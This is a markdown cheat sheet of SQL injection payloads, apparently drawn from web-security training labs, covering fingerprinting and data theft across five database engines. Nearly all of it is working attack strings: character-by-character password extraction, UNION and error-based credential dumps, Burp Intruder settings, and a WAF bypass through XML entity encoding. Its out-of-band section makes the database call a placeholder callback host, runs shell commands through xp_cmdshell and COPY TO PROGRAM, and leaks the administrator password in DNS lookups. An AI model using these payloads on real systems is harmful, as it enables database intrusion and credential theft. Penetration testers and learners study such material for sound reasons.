# SQLi — Database Fingerprinting & Extraction Cheat Sheet

Quick-reference payloads to identify which database engine you're targeting and extract data.
Test one at a time. The one that behaves differently = your DB.

---

## 1. Time-Based (Blind — no output)

The injected query causes a deliberate delay. If the response takes ~10s, the payload executed.
Use this when the app gives you nothing back — no errors, no data, no visible change. The delay itself is your confirmation signal. Think of it as knocking on a wall and listening for the echo — you're not reading output, you're measuring time.

| DB         | Payload |
|------------|---------|
| PostgreSQL | `'%3B SELECT pg_sleep(10)--` |
| MySQL      | `'%3B SELECT SLEEP(10)--` |
| MSSQL      | `'; WAITFOR DELAY '0:0:10'--` |
| Oracle     | `'||(SELECT dbms_pipe.receive_message(('a'),10) FROM dual)--` |
| SQLite     | `'%3B SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))--` |

**Conditional form (more reliable — wraps the delay in a true/false expression):**

| DB         | True (delays) | False (instant) |
|------------|---------------|-----------------|
| PostgreSQL | `'%3B SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--` | `'%3B SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--` |
| MySQL      | `'%3B SELECT IF(1=1,SLEEP(10),0)--` | `'%3B SELECT IF(1=2,SLEEP(10),0)--` |
| MSSQL      | `'; IF (1=1) WAITFOR DELAY '0:0:10'--` | `'; IF (1=2) WAITFOR DELAY '0:0:10'--` |
| Oracle     | `'%7C%7C(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)--` | same with `1=2` |

**Full extraction chain — character by character (cookie injection):**
```
# PostgreSQL
# 1. Confirm user exists
'%3B SELECT CASE WHEN (username%3D'administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
# 2. Extract password char by char
'%3B SELECT CASE WHEN (SUBSTRING(password,1,1)%3D'a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username%3D'administrator'--

# MySQL
# 1. Confirm user exists
'%3B SELECT IF((SELECT COUNT(*) FROM users WHERE username%3D'administrator')%3D1,SLEEP(10),0)--
# 2. Extract password char by char
'%3B SELECT IF(SUBSTRING(password,1,1)%3D'a',SLEEP(10),0) FROM users WHERE username%3D'administrator'--

# MSSQL
# 1. Confirm user exists
'; IF (SELECT COUNT(*) FROM users WHERE username='administrator')=1 WAITFOR DELAY '0:0:10'--
# 2. Extract password char by char
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' WAITFOR DELAY '0:0:10'--

# Oracle
# 1. Confirm user exists
'||(SELECT CASE WHEN (username='administrator') THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM users WHERE rownum=1)||'
# 2. Extract password char by char
'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM users WHERE username='administrator')||'

# Burp Intruder settings (all DBs):
# Attack type: Cluster bomb
# Payload 1: position (1 to 20)
# Payload 2: character (a-z, 0-9)
# Resource pool: max 1 concurrent request  <-- critical
# Sort results by Response received (ms) — ~10000ms = hit
```

> **Cookie injection note:** Always URL-encode `;` as `%3B` and `=` as `%3D` inside cookie values.
> Raw `;` splits cookies at the HTTP layer — your payload never reaches SQL.

---

## 2. Error-Based (Visible errors returned)

Force a DB-specific error. The error message reveals the engine.
This is the fastest fingerprinting method when it works — each DB has a unique error format, so a single `'` can tell you exactly what you're dealing with. The "targeted" payloads below go further: they intentionally cause a type mismatch to force the DB to print version data inside the error message itself.

| DB         | Payload | Expected error contains |
|------------|---------|------------------------|
| PostgreSQL | `'` | `ERROR: unterminated quoted string` |
| MySQL      | `'` | `You have an error in your SQL syntax` |
| MSSQL      | `'` | `Unclosed quotation mark` |
| Oracle     | `'` | `ORA-01756: quoted string not properly terminated` |
| SQLite     | `'` | `unrecognized token` |

**Targeted error extraction (version in error message):**

| DB         | Payload |
|------------|---------|
| PostgreSQL | `' AND 1=CAST((SELECT version()) AS int)--` |
| MySQL      | `' AND extractvalue(1,concat(0x7e,(SELECT version())))--` |
| MSSQL      | `' AND 1=CONVERT(int,(SELECT @@version))--` |
| Oracle     | `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--` |

**Full extraction chain (version + credentials via error message):**
```
# PostgreSQL — type cast trick (dumps value inside error)
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--

# MySQL — extractvalue trick (dumps value inside error)
' AND extractvalue(1,concat(0x7e,(SELECT username FROM users LIMIT 1)))--
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='administrator')))--

# MSSQL — convert trick (dumps value inside error)
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--
' AND 1=CONVERT(int,(SELECT password FROM users WHERE username='administrator'))--

# Oracle — DRITHSX trick (dumps value inside error)
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT username FROM users WHERE rownum=1))--
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT password FROM users WHERE username='administrator'))--
```

---

## 3. UNION-Based (Output reflected in page)

Detect column count first, then fingerprint by version string.
Use this when the app reflects query results directly on the page (e.g. product listings, search results, user profiles). You're appending a second SELECT to the original query and hijacking one of the output columns to display your data. The catch: your injected SELECT must return the same number of columns as the original query — that's what Steps 1 and 2 are solving.

**Step 1 — Find column count (increment until no error):**
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   <- error here means 2 columns
```

Or with NULLs:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Step 2 — Find a string-type column:**
```
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

**Step 3 — Extract version string:**

| DB         | Payload (2 columns, col 1 is string) |
|------------|--------------------------------------|
| PostgreSQL | `' UNION SELECT version(),NULL--` |
| MySQL      | `' UNION SELECT @@version,NULL--` |
| MSSQL      | `' UNION SELECT @@version,NULL--` |
| Oracle     | `' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--` |
| SQLite     | `' UNION SELECT sqlite_version(),NULL--` |

**Full extraction chain per DB (2 column example, col 1 is string):**
```
# PostgreSQL
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username||':'||password,NULL FROM users--

# MySQL
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT CONCAT(username,':',password),NULL FROM users--

# MSSQL
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username+':'+password,NULL FROM users--

# Oracle (no information_schema — uses Oracle catalog views instead)
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT username||':'||password,NULL FROM users--

# SQLite
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--
' UNION SELECT username||':'||password,NULL FROM users--
```

---

## 4. Boolean-Based (Blind — behavior difference, no timing)

Response changes (size, content, status code) based on true/false.
Similar to time-based but instead of measuring delay, you're looking for any difference in the response — a word that disappears, a different page length, a 200 vs 302. Send a true condition and a false condition and compare. If the app behaves differently, you have a signal you can use for extraction. Slower to spot than errors, but very reliable once confirmed.

| DB         | True | False |
|------------|------|-------|
| All        | `' AND 1=1--` | `' AND 1=2--` |
| PostgreSQL | `' AND 'a'='a'--` | `' AND 'a'='b'--` |
| MySQL      | `' AND 1=1#` | `' AND 1=2#` |
| MSSQL      | `' AND 1=1--` | `' AND 1=2--` |
| Oracle     | `' AND 1=1--` | `' AND 1=2--` |

**Full extraction chain per DB — character by character:**
```
# PostgreSQL
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

# MySQL
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

# MSSQL
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LEN(password)>1)='a'--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

# Oracle
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a'--

# Automate with Burp Intruder — sniper mode, payload on the character guess
# Compare response size or content between true/false requests
```

---

## 5. Inline Version Fingerprint (No UNION needed)

Once you have confirmed code execution (via any method above), use these queries directly to pull the exact DB version. Useful when you have stacked queries, a second-order injection, or direct DB access — anywhere you can run an arbitrary SELECT and read the result.

| DB         | Query | Returns |
|------------|-------|---------|
| PostgreSQL | `SELECT version()` | `PostgreSQL 14.x on x86_64...` |
| MySQL      | `SELECT @@version` | `8.0.x` |
| MySQL      | `SELECT @@version_comment` | `MySQL Community Server` |
| MSSQL      | `SELECT @@version` | `Microsoft SQL Server 20xx...` |
| MSSQL      | `SELECT serverproperty('productversion')` | `15.0.xxxx.x` |
| Oracle     | `SELECT banner FROM v$version WHERE rownum=1` | `Oracle Database 19c...` |
| SQLite     | `SELECT sqlite_version()` | `3.x.x` |

---

## 6. Out-of-Band / OAST (DNS or HTTP callback)

Use this when the app gives you no visible output, no errors, and timing is unreliable (async processing, WAF throttling, network jitter). Instead of reading the response, you make the DB reach out to a server you control — a DNS lookup or HTTP request. If your server receives the callback, the payload executed.

**Best tool:** Burp Collaborator (Pro) or [interactsh](https://github.com/projectdiscovery/interactsh) (free, open source).
Replace `COLLABORATOR.NET` with your actual callback domain.

**Why DNS specifically:** DNS is almost never blocked outbound, even on hardened networks. HTTP might be filtered — DNS usually isn't.

**Step 1 — Confirm OOB interaction (ping only, no data):**

| DB         | Method | Payload |
|------------|--------|---------|
| PostgreSQL | `COPY` to external | `'; COPY (SELECT version()) TO PROGRAM 'nslookup COLLABORATOR.NET'--` |
| PostgreSQL | `dblink` (if installed) | `' AND 1=1 AND (SELECT dblink_connect('host=COLLABORATOR.NET'))--` |
| MySQL      | `LOAD_FILE` (needs `FILE` priv) | `' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.COLLABORATOR.NET\\\\foo'))--` |
| MySQL      | `SELECT INTO DUMPFILE` | `' UNION SELECT load_file('\\\\COLLABORATOR.NET\\share')--` |
| MSSQL      | `xp_dirtree` (no sysadmin needed) | `'; EXEC xp_dirtree '\\COLLABORATOR.NET\share'--` |
| MSSQL      | `xp_fileexist` | `'; EXEC xp_fileexist '\\COLLABORATOR.NET\share'--` |
| MSSQL      | `xp_cmdshell` (needs sysadmin) | `'; EXEC xp_cmdshell 'nslookup COLLABORATOR.NET'--` |
| Oracle     | `UTL_HTTP` | `' AND (SELECT UTL_HTTP.request('http://COLLABORATOR.NET') FROM dual) IS NOT NULL--` |
| Oracle     | `UTL_INADDR` (DNS) | `' AND (SELECT UTL_INADDR.get_host_address('COLLABORATOR.NET') FROM dual) IS NOT NULL--` |
| Oracle     | `DBMS_LDAP` (DNS) | `' AND (SELECT DBMS_LDAP.init('COLLABORATOR.NET',80) FROM dual) IS NOT NULL--` |
| SQLite     | N/A | SQLite has no native network functions — OOB not applicable |

**Step 2 — Exfiltrate data via DNS subdomain:**

The DB constructs a subdomain containing the secret — your server logs the lookup and the subdomain IS the data.

| DB         | Payload |
|------------|---------|
| Oracle     | `' AND (SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR.NET') FROM dual) IS NOT NULL--` |
| Oracle     | `' AND (SELECT DBMS_LDAP.init((SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR.NET',80) FROM dual) IS NOT NULL--` |
| MSSQL      | `'; EXEC xp_dirtree '\\'+( SELECT TOP 1 password FROM users WHERE username='administrator')+'.COLLABORATOR.NET\share'--` |
| MySQL      | `' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users WHERE username='administrator'), '.COLLABORATOR.NET\\\\foo'))--` |

> **What you see in Collaborator/interactsh:** A DNS lookup like `s3cr3tpassword.COLLABORATOR.NET` — the subdomain IS the exfiltrated data.

**Interactsh quick setup (free alternative to Burp Collaborator):**
```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client
# You'll get a domain like abc123.oast.fun — use that in your payloads
```

---

## 7. WAF Bypass via XML Encoding

Use this when the injection point is inside an XML body (e.g. a stock check, SOAP request, API) and a WAF is blocking your payloads. The WAF scans the raw request and sees encoded gibberish — but the XML parser decodes it back to plain SQL before the DB runs it.

**How it works:**
- WAF sees: `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` → doesn't match `UNION` → allowed through
- XML parser decodes it to: `UNION` → DB runs it normally

**Tool:** Burp Extension → **Hackvertor**
- Highlight your payload text → right-click → Hackvertor → Encode → `hex_entities`
- Hackvertor wraps it in `<@hex_entities>...</@hex_entities>` tags automatically

**Request structure:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1 <@hex_entities>UNION SELECT username||':'||password FROM users</@hex_entities></storeId>
</stockCheck>
```

> Only encode the **injection payload** — not the XML tags or the leading `1`. The Hackvertor tag must sit cleanly inside the XML element, not overlapping the closing tag.

**Full extraction chain (XML + WAF bypass):**
```xml
# Step 1 — confirm column count (1 column)
<storeId>1 <@hex_entities>UNION SELECT NULL</@hex_entities></storeId>

# Step 2 — list all tables
<storeId>1 <@hex_entities>UNION SELECT table_name FROM information_schema.tables</@hex_entities></storeId>

# Step 3 — list columns in target table
<storeId>1 <@hex_entities>UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'</@hex_entities></storeId>

# Step 4 — dump credentials
<storeId>1 <@hex_entities>UNION SELECT username||':'||password FROM users</@hex_entities></storeId>
```

**Common mistakes:**
- Encoding the whole `storeId` value including the leading `1` — breaks the query
- Letting the Hackvertor closing tag `</@hex_entities>` swallow part of `</storeId>` — causes XML parse error
- Using URL encoding (`%55`) instead of XML entity encoding (`&#x55;`) — XML parser won't decode it

---

## 8. Comment Syntax Reference

Different DBs use different comment styles — wrong comment = broken payload.
Comments are critical because they discard the rest of the original query after your injection point, preventing syntax errors. If your payload isn't working and you've ruled out encoding issues, the comment style is usually the next thing to check.

| DB         | Single-line comment | Inline comment |
|------------|---------------------|----------------|
| PostgreSQL | `--` | `/* */` |
| MySQL      | `--` (needs space after) or `#` | `/* */` |
| MSSQL      | `--` | `/* */` |
| Oracle     | `--` | `/* */` |
| SQLite     | `--` | `/* */` |

> MySQL quirk: `--` requires a space after it (`-- -` is a common workaround). `#` is safer for MySQL in URLs.

---

## 9. String Concatenation (Confirms DB type via syntax)

Each DB engine has its own way of joining strings. If you can inject a concat expression and the app processes it without error, it narrows down the engine. Useful as a secondary confirmation when timing or errors are ambiguous — `||` working vs `+` working tells you a lot.

| DB         | Concat syntax | Example |
|------------|---------------|---------|
| PostgreSQL | `\|\|` | `username\|\|':'\|\|password` |
| MySQL      | `CONCAT()` | `CONCAT(username,':',password)` |
| MSSQL      | `+` | `username+':'+password` |
| Oracle     | `\|\|` | `username\|\|':'\|\|password` |
| SQLite     | `\|\|` | `username\|\|':'\|\|password` |

---

## URL Encoding Quick Reference

Always encode these when injecting into cookies or URL parameters:

| Char | Encoded |
|------|---------|
| `;`  | `%3B`   |
| `=`  | `%3D`   |
| `'`  | `%27`   |
| `"`  | `%22`   |
| ` `  | `%20` or `+` |
| `(`  | `%28`   |
| `)`  | `%29`   |
| `#`  | `%23`   |
| `\|` | `%7C`   |
| `+`  | `%2B`   |

---

## Decision Tree

```
Start
  |
  +--> Send ' alone
        |
        +--> Error visible? ---------> Error-based (Section 2)
        |
        +--> Output in page? --------> UNION-based (Section 3)
        |
        +--> Response changes? ------> Boolean-based (Section 4)
        |
        +--> No change at all? ------> Time-based (Section 1)
        |
        +--> Input inside XML body? -> WAF bypass via XML encoding (Section 7)
        |
        +--> Async / WAF blocks timing? -> OOB/OAST (Section 6)
```
